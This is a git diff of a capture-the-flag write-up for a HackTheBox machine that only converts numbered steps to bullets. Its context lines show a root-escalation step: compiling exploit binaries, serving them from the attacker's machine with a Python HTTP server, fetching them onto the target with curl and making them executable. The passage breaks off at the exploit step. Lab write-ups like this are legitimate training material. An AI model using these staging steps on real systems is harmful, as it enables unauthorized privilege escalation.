@@ -355,7 +355,7 @@ HTB Godfather
 ### Step 21.  Follow the instruction on the website, I gained the `root` privilege:
 - On my computer:
   
-  1. Git and prepared the files.
+  - Git and prepared the files.
 
 ```bash
 ┌─[admin@parrot]─[~/Desktop]
@@ -378,12 +378,12 @@ gcc -o exp exp.c -lcap
 gcc -o gc getshell.c
 ```
 
-  2. The command allows my computer to become `http` server:
+  - The command allows my computer to become `http` server:
   ```python3 -m http.server 8000```
 
 - On server:
     
-    1. Using `curl` to connect to my computer which became a `http` server and download operate file:
+    - Using `curl` to connect to my computer which became a `http` server and download operate file:
 
     ```bash
     admin@2million:~$ curl http://<MY_COMPUTER_IP>:8000/gc -O
@@ -401,13 +401,13 @@ gcc -o gc getshell.c
     100 1238k  100 1238k    0     0   209k      0  0:00:05  0:00:05 --:--:--  257k
     ```
 
-    2. Make directory and add `execute` privilege to downloaded files:
+    - Make directory and add `execute` privilege to downloaded files:
     ```bash
     admin@2million:~$ mkdir ovlcap 
     admin@2million:~$ chmod +x gc exp fuse
     ```
 
-    3. Exploit:
+    - Exploit:
 
     ```bash
     *shell session 1:
